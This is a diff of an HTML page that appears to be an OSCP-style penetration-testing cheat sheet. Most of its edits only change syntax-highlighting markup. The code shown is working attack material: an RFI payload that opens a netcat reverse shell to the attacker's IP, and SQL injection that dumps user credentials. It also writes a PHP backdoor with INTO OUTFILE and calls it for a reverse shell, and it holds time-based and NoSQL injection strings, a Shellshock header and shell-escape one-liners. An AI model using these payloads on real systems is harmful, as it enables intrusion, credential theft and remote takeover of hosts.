@@ -485,10 +485,10 @@ mv shell.txt shell.asp<span class="p">;</span>.txt
 </code></pre></div>
 
 <h5>RFI: Host evil.txt on apache and serve it as the LANG file</h5>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nx">“nc</span> <span class="nx">–nv</span> <span class="mf">10.11</span><span class="o">.</span><span class="mf">0.160</span> <span class="mi">4444</span> <span class="nx">–e</span> <span class="nx">cmd</span><span class="o">.</span><span class="nx">exe</span><span class="s2">&quot;);?&gt; # evil.txt on apache</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot;nc –nv 10.11.0.160 4444 –e cmd.exe&quot;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"> # evil.txt on apache</span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="err">nc –nvlp 4444 # set up listener</span>
+<div class="highlight"><pre><span></span><code>nc –nvlp <span class="m">4444</span> <span class="c1"># set up listener</span>
 </code></pre></div>
 
 <p><code>http://10.11.15.54/addguestbook.php?name=a&amp;comment=b&amp;LANG=http://10.11.0.160/evil.txt%00</code></p>
@@ -533,65 +533,61 @@ sysctl.conf
 
 <h4>Websites SQLi + Databases</h4>
 <p>Enumerating MySQL database in URL</p>
-<div class="highlight"><pre><span></span><code><span class="n">mysql</span> <span class="err">–</span><span class="n">u</span> <span class="n">root</span><span class="p">;</span> <span class="n">use</span> <span class="n">webappdb</span><span class="p">;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span>
-<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">name</span><span class="o">=</span><span class="err">‘</span><span class="n">wronguser</span><span class="err">’</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="o">#</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;wrongpass&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span><span class="p">;</span> <span class="n">use</span> <span class="n">webappdb</span><span class="p">;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;wronguser&#39;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="o">#</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;wrongpass&#39;</span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="err">#</span> <span class="nx">URL</span> <span class="nx">vulnerability</span> <span class="k">for</span> <span class="nx">GET</span> <span class="nx">requests</span> 
-<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/comment.php?id=735`</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># URL vulnerability for GET requests </span>
+http://127.0.0.1/comment.php?id<span class="o">=</span><span class="m">735</span>
 
-<span class="err">#</span> <span class="nx">order</span> <span class="nx">by</span> <span class="mi">6</span> <span class="err">#</span> <span class="nx">col</span> <span class="nx">enumeration</span><span class="o">:</span> <span class="nx">works</span> <span class="nx">fine</span>
-<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/comment.php?id=735</span>
+<span class="c1"># order by 6 # col enumeration: works fine</span>
+http://127.0.0.1/comment.php?id<span class="o">=</span><span class="m">735</span>
 
-<span class="err">#</span> <span class="nx">order</span> <span class="nx">by</span> <span class="mf">7.</span> <span class="err">#</span> <span class="nx">Breaks</span><span class="p">.</span> <span class="nx">Pick</span> <span class="nx">display</span> <span class="nx">field</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">(</span><span class="nx">eg5</span><span class="p">)</span>
-<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/comment.php?id=735 </span>
+<span class="c1"># order by 7. # Breaks. Pick display field &lt;7(eg5)</span>
+http://127.0.0.1/comment.php?id<span class="o">=</span><span class="m">735</span> 
 
-<span class="o">?</span><span class="nx">id</span><span class="o">=</span><span class="mi">735</span> <span class="nx">uinion</span> <span class="nx">all</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="err">@@</span><span class="nx">version</span><span class="o">/</span><span class="nx">user</span><span class="p">(),</span><span class="mi">6</span>  <span class="err">#</span> <span class="nx">Col</span><span class="err">#</span> <span class="nx">permit</span> <span class="nx">UNION</span> <span class="nx">ALL</span> <span class="nx">SELECT</span>
+?id<span class="o">=</span><span class="m">735</span> uinion all <span class="k">select</span> <span class="m">1</span>,2,3,4,@@version/user<span class="o">()</span>,6  <span class="c1"># Col# permit UNION ALL SELECT</span>
 
-<span class="o">?</span><span class="nx">id</span><span class="o">=</span><span class="mi">735</span> <span class="nx">uinion</span> <span class="nx">all</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nx">user</span><span class="p">(),</span><span class="mi">6</span>
+?id<span class="o">=</span><span class="m">735</span> uinion all <span class="k">select</span> <span class="m">1</span>,2,3,4,user<span class="o">()</span>,6
 
-<span class="err">…</span><span class="mi">4</span><span class="p">,</span><span class="nx">table_name</span><span class="p">,</span><span class="mi">6</span> <span class="nx">FROM</span> <span class="nx">information_schema</span><span class="p">.</span><span class="nx">tables</span>
+<span class="s2">&quot;…4,table_name,6 FROM information_schema.tables&quot;</span>
 
-<span class="err">…</span><span class="mi">4</span><span class="p">,</span><span class="nx">column_name</span><span class="p">,</span><span class="mi">6</span> <span class="nx">FROM</span> <span class="nx">information_schema</span><span class="p">.</span><span class="nx">columns</span> <span class="nx">where</span> <span class="nx">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span>
+<span class="s2">&quot;…4,column_name,6 FROM information_schema.columns where table_name=&#39;users&#39;&quot;</span>
 
-<span class="err">…</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="nx">password</span><span class="p">),</span><span class="mi">6</span> <span class="nx">FROM</span> <span class="nx">users</span>
+<span class="s2">&quot;…,4,concat(name,0x3a,password),6 FROM users&quot;</span>
 
-<span class="err">#</span> <span class="nx">Reverse</span> <span class="nx">shell</span><span class="err">…</span> <span class="nx">SQL</span> <span class="nx">puts</span> <span class="nx">code</span> <span class="nx">to</span> <span class="nx">file</span> <span class="o">&amp;</span> <span class="nx">code</span> <span class="nx">execution</span>
-<span class="err">#</span> <span class="nx">put</span> <span class="nx">php</span> <span class="nx">shell_exec</span> <span class="nx">into</span> <span class="nx">a</span> <span class="k">new</span> <span class="nx">file</span> <span class="nx">on</span> <span class="nx">server</span>
-<span class="err">…</span><span class="mi">4</span><span class="p">,</span><span class="s2">&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">‘cmd’</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="s2">&quot;</span><span class="p">,</span><span class="mi">6</span> <span class="nx">into</span> <span class="nx">OUTFILE</span> <span class="s1">&#39;c:/xamp/htdocs/backdoor.php&#39;</span>
+<span class="c1"># Reverse shell SQL puts code to file &amp; code execution</span>
+<span class="c1"># put php shell_exec into a new file on server</span>
+<span class="s2">&quot;…4,&quot;</span>&lt;?php <span class="nb">echo</span> shell_exec<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>‘cmd’<span class="o">])</span><span class="p">;</span>?&gt;<span class="s2">&quot;,6 into OUTFILE &#39;c:/xamp/htdocs/backdoor.php&#39;&quot;</span>
 
-<span class="err">#</span> <span class="nx">setup</span> <span class="nx">a</span> <span class="nx">listener</span>
-<span class="nx">nc</span> <span class="err">–</span><span class="nx">nlvp</span> <span class="mi">4444</span> 
-<span class="err">#</span> <span class="nx">execute</span>
-<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/backdoor.php?cmd=nc –nv 10.11.0.160 4444 –e cmd.exe</span>
+<span class="c1"># setup a listener</span>
+nc –nlvp <span class="m">4444</span> 
+<span class="c1"># execute</span>
+http://127.0.0.1/backdoor.php?cmd<span class="o">=</span>nc –nv <span class="m">10</span>.11.0.160 <span class="m">4444</span> –e cmd.exe
 
-<span class="err">#</span> <span class="nx">Local</span> <span class="nx">web</span> <span class="nx">proxy</span> <span class="p">(</span><span class="nx">POST</span> <span class="nx">requests</span> <span class="o">=</span> <span class="nx">non</span> <span class="nx">URL</span><span class="p">)</span>
-<span class="err">#</span> <span class="nx">Tamper</span> <span class="nx">Data</span><span class="o">:</span> <span class="nx">intercepts</span> <span class="nx">HTTP</span> <span class="nx">request</span> <span class="p">=&gt;</span> <span class="nx">edit</span> <span class="nx">parameters</span><span class="o">:</span> <span class="nx">bypassing</span> <span class="nx">client</span> <span class="nx">side</span> <span class="nx">restrictions</span>
-<span class="err">#</span> <span class="nx">place</span> <span class="nx">php</span> <span class="nx">shell_exec</span> <span class="k">in</span> <span class="nx">file</span> <span class="nx">on</span> <span class="nx">server</span>
-<span class="nx">en</span> <span class="s1">&#39;union all select 1,2,3,4,&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="s1">&quot;,6 into OUTFILE &#39;</span><span class="nx">c</span><span class="o">:</span><span class="err">/xampp/htdocs/new_backdoor.php%00&#39;&#39;</span>
+<span class="c1"># Local web proxy (POST requests = non URL)</span>
+<span class="c1"># Tamper Data: intercepts HTTP request =&gt; edit parameters: bypassing client side restrictions</span>
+<span class="c1"># place php shell_exec in file on server</span>
+en <span class="s1">&#39;union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;</span>cmd<span class="s1">&#39;]);?&gt;&quot;,6 into OUTFILE &#39;</span>c:/xampp/htdocs/new_backdoor.php%00<span class="s1">&#39;&#39;</span>
 
-<span class="err">#</span> <span class="nx">setup</span> <span class="nx">listener</span>
-<span class="nx">nc</span> <span class="err">–</span><span class="nx">nlvp</span> <span class="mi">4444</span> 
+<span class="c1"># setup listener</span>
+nc -nlvp <span class="m">4444</span> 
 
-<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.15.54//new_backdoor.php?cmd=nc -nv 10.11.0.160 4444 -e cmd.exe</span>
+http://10.11.15.54//new_backdoor.php?cmd<span class="o">=</span>nc -nv <span class="m">10</span>.11.0.160 <span class="m">4444</span> -e cmd.exe
 </code></pre></div>
 
 <h5>Mysql Queries: 30s delay to MSSQL, MYSQL, POSTGRESQL</h5>
-<div class="highlight"><pre><span></span><code><span class="err"># Original Query</span>
-<span class="err">SELECT * FROM products WHERE name=&#39;Test&#39;;</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># Original Query</span>
+SELECT * FROM products WHERE <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;Test&#39;</span><span class="p">;</span>
 </code></pre></div>
 
 <h5>Injection values</h5>
-<div class="highlight"><pre><span></span><code><span class="err">#</span> <span class="nt">MSSQL</span>
-<span class="s1">&#39;; WAITFOR DELAY &#39;</span><span class="nt">00</span><span class="p">:</span><span class="nd">00</span><span class="p">:</span><span class="nd">30</span><span class="s1">&#39;;</span>
-
-<span class="s1"># MYSQL</span>
-<span class="s1">&#39;</span><span class="nt">-SLEEP</span><span class="o">(</span><span class="nt">30</span><span class="o">);</span>
-
-<span class="err">#</span> <span class="nt">POSTGRESQL</span>
-<span class="err">&#39;</span><span class="o">;</span> <span class="nt">SELECT</span> <span class="nt">pg_sleep</span><span class="o">(</span><span class="nt">30</span><span class="o">);</span>
-</code></pre></div>
-
+<h1>MSSQL</h1>
+<p><code>'; WAITFOR DELAY '00:00:30';</code></p>
+<h1>MYSQL</h1>
+<p><code>'-SLEEP(30);</code></p>
+<h1>POSTGRESQL</h1>
+<p><code>'; SELECT pg_sleep(30);</code></p>
 <h5>Resulting queries</h5>
 <div class="highlight"><pre><span></span><code><span class="o">#</span> <span class="n">MSSQL</span>
 <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;Test&#39;</span><span class="p">;</span> <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">&#39;00:00:30&#39;</span><span class="p">;</span>
@@ -615,7 +611,7 @@ sysctl.conf
 <div class="highlight"><pre><span></span><code>git clone https://github.com/codingo/NoSQLMap.git 
 pip install couchdb<span class="p">;</span> pip install pbkdf2<span class="p">;</span> pip install ipcalc 
 python nosqlmap.py
-a<span class="s1">&#39;; return this.a != &#39;</span>BadData’<span class="err">&#39;</span><span class="p">;</span> var <span class="nv">dummy</span><span class="o">=</span>‘!<span class="sb">`</span>
+a<span class="s1">&#39;; return this.a != &#39;</span>BadData<span class="s1">&#39;; var dummy=&#39;</span>!<span class="err">&#39;</span><span class="sb">`</span>
 </code></pre></div>
 
 <h5>Mdbtools</h5>
@@ -841,7 +837,7 @@ curl -H <span class="s2">&quot;User-Agent: () { :; }; /bin/bash -c &#39;echo aaa
 <span class="s2">nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi </span><span class="nv">$ip</span><span class="s2"></span>
 </code></pre></div>
 
-<p><img alt="image" src="/assets/images/oscp/shellshock.png" title="shellshock"></p>
+<p><img alt="image" src="/images/oscp/shellshock.png" title="shellshock"></p>
 <h4>Shell escape sequences</h4>
 <div class="highlight"><pre><span></span><code>:!bash <span class="c1"># vi, vim</span>
 :set <span class="nv">shell</span><span class="o">=</span>/bin/bash:shell <span class="c1"># vi, vim</span>
@@ -850,7 +846,7 @@ find / -exec /usr/bin/awk <span class="s1">&#39;BEGIN {system(&quot;/bin/bash&qu
 <span class="s1">awk &#39;</span>BEGIN <span class="o">{</span>system<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)}</span>’ <span class="c1"># awk</span>
 --interactive <span class="c1"># nmap</span>
 <span class="nb">echo</span> <span class="s2">&quot;os.execute(&#39;/bin/sh&#39;)&quot;</span> &gt; exploit.nse sudo nmap --script<span class="o">=</span>exploit.nse <span class="c1"># nmap </span>
-perl -e <span class="err">&#39;</span><span class="nb">exec</span> <span class="s2">&quot;/bin/bash&quot;</span><span class="p">;</span>’ <span class="c1"># Perl</span>
+perl -e <span class="s1">&#39;exec &quot;/bin/bash&quot;;&#39;</span> <span class="c1"># Perl</span>
 </code></pre></div>
 
 <h4>Upgrade *nix shell</h4>
@@ -881,9 +877,6 @@ searchsploit apache <span class="m">2</span>.x <span class="p">|</span> grep -v 
 searchsploit slmail
 searchsploit x PATH
 </code></pre></div>
-
-<h3>Linux Privilege Escalation</h3>
-<h3>Windows Privilege Escalation</h3>
     </div><!-- /.entry-content -->
 
   </article>
